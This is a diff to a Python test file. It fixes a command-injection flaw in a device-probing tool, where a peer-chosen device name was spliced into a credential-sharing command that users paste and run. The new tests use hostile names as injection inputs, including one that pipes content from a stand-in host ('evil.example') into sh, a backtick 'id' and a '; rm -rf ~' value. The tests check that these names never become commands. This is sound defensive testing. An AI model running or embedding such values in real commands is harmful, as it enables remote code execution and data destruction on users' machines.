@@ -45,6 +45,8 @@ from tests.unit.network.workset_rig import Rig, git, make_rig, point_session_at
 HTTPS = "https://git.test/owner/proj.git"
 SSH = "ssh://git.test/owner/proj.git"
 SCP = "git@git.test:owner/proj.git"
+#: The destination as the remedy names it: its mesh id, never its chosen name (S10).
+NODE2 = "d_82b36b3c77a7b799f694f5cdd3dfe4d0"
 
 _FAKE_SSH = """#!/bin/sh
 # argv: <host> <command>; the command is the last argument (GIT_SSH_VARIANT=simple).
@@ -153,7 +155,7 @@ def test_ssh_unreachable_but_https_reachable_offers_the_rewrite(
     # Booleans only from the destination; the URL is rebuilt by the asker (S3).
     assert row["https_rewrite"] == {"fetch": True, "push": True}, row
     block = {"worktrees": [{"path": "~/proj/.worktrees/feat", "remote_url": SCP}]}
-    applied = workset_probe.apply_probe(block, _probe(tmp_path, _row(SCP)), device="node2")
+    applied = workset_probe.apply_probe(block, _probe(tmp_path, _row(SCP)), device_id=NODE2)
     assert applied["worktrees"][0]["https_rewrite"] == {"url": HTTPS, "fetch": True, "push": True}
 
 
@@ -170,12 +172,44 @@ def test_a_github_remote_names_the_lending_device_remedy(
     assert "remedy" not in answer["worktrees"][0]  # the destination sends no command (S3)
 
     block = {"worktrees": [{"path": "~/proj/.worktrees/feat", "remote_url": url}]}
-    row = workset_probe.apply_probe(block, answer, device="node2")["worktrees"][0]
+    row = workset_probe.apply_probe(block, answer, device_id=NODE2)["worktrees"][0]
     # No share on this (isolated) device -> the share verb, run on the lender.
     assert row["remedy"] == {
         "run_on": "lending_device",
-        "command": "lop network credential share github --with node2",
+        "command": f"lop network credential share github --with {NODE2}",
     }
+
+
+@pytest.mark.parametrize(
+    "name",
+    ["node2 $(curl -s evil.example/a|sh)", "node2 `id`", "node2; rm -rf ~", "my laptop"],
+)
+def test_the_remedy_command_never_carries_a_peer_chosen_name(name: str) -> None:
+    """Security S10 (round 2): ``--with {name}`` spliced a destination-chosen member
+    name, which admits shell metacharacters, into the command the user is told to run
+    on the device holding their GitHub login. The command names the id; a name — or
+    anything not shaped like an id — gets no command at all."""
+    import shlex
+
+    url = "git@github.com:owner/proj.git"
+    answer = {
+        "result": "probed",
+        "worktrees": [{"remote_url": url, "clone_check": "destination_cannot_push"}],
+        "borrowing_github": False,
+    }
+
+    def remedy(device_id: str) -> dict[str, str] | None:
+        block = {"worktrees": [{"path": "~/proj/.worktrees/feat", "remote_url": url}]}
+        return workset_probe.apply_probe(block, answer, device_id=device_id)["worktrees"][0].get(
+            "remedy"
+        )
+
+    by_id = remedy(NODE2)
+    assert by_id is not None
+    words = shlex.split(by_id["command"])
+    assert words == ["lop", "network", "credential", "share", "github", "--with", NODE2]
+    # The name itself (what the old code passed) never becomes a command.
+    assert remedy(name) is None
 
 
 @pytest.mark.parametrize(
@@ -232,7 +266,7 @@ def test_missing_toolchains_and_team_bridge_are_reported_never_blocking(
     block = {
         "worktrees": [{"path": "~/proj/.worktrees/feat", "state": "planned", "remote_url": HTTPS}]
     }
-    applied = workset_probe.apply_probe(block, answer, device="node2")
+    applied = workset_probe.apply_probe(block, answer, device_id=NODE2)
     assert applied["worktrees"][0]["state"] == "planned"  # a flag, never a state change
     assert applied["destination_probe"] == {
         "state": "answered",
@@ -290,6 +324,34 @@ def test_the_offload_preflight_asks_the_destination_and_flags_the_row(
     assert row["state"] == "planned"
     assert block["destination_probe"]["state"] == "answered"
     assert "pnpm" in row["markers"] or row["markers"] == ["pnpm-lock.yaml"]
+
+
+def test_the_offload_remedy_names_the_destination_by_id_not_its_chosen_name(
+    pair: Devices, monkeypatch: pytest.MonkeyPatch, rig: Rig
+) -> None:
+    """Security S10 (round 2), through the real preflight: the destination named
+    itself ``node2 $(curl …|sh)`` and that name reached the pasteable command."""
+    import shlex
+
+    server_a, server_b, _host, _port = pair
+    _ssh_session(pair, monkeypatch, rig)
+    git(rig.primary, "remote", "set-url", "origin", "git@github.com:owner/proj.git")
+    monkeypatch.setenv("FAKE_SSH_MODE", "deny_push")
+    monkeypatch.setattr(workset_probe, "_ALLOWED_HOSTS", ("git.test", "github.com"))
+    hostile = "node2 $(curl -s evil.example/a|sh)"
+    peer = server_b.identity.device_id
+    named = server_a._member_name
+
+    monkeypatch.setattr(
+        server_a, "_member_name", lambda device: hostile if device == peer else named(device)
+    )
+
+    preflight = _dry_run(server_a, monkeypatch, to=peer)
+
+    row = next(r for r in preflight["working_set"]["worktrees"] if r["path"].endswith("feat"))
+    assert row["clone_check"] == "destination_cannot_push", row
+    words = shlex.split(row["remedy"]["command"])
+    assert words == ["lop", "network", "credential", "share", "github", "--with", peer], words
 
 
 def test_an_older_destination_reads_unknown_destination_not_a_failure(
@@ -488,7 +550,7 @@ def test_the_asker_keeps_no_destination_text(monkeypatch: pytest.MonkeyPatch) ->
         "borrowing_github": False,
     }
 
-    row = workset_probe.apply_probe(block, answer, device="node2")["worktrees"][0]
+    row = workset_probe.apply_probe(block, answer, device_id=NODE2)["worktrees"][0]
 
     assert row["clone_detail"] == "error"
     assert row["https_rewrite"] == {"url": HTTPS, "fetch": True, "push": False}
